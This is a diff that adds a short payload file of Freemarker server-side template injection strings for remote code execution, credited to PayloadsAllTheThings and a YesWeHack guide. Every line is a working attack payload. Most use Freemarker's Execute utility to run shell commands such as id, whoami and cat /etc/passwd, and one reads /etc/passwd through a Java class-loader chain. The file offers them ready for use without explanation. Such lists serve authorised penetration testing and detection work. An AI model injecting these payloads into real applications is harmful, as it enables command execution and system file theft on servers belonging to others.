@@ -1,0 +1,9 @@
+# Freemarker SSTI RCE
+# Source: PayloadsAllTheThings, YesWeHack SSTI guide
+
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
+[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
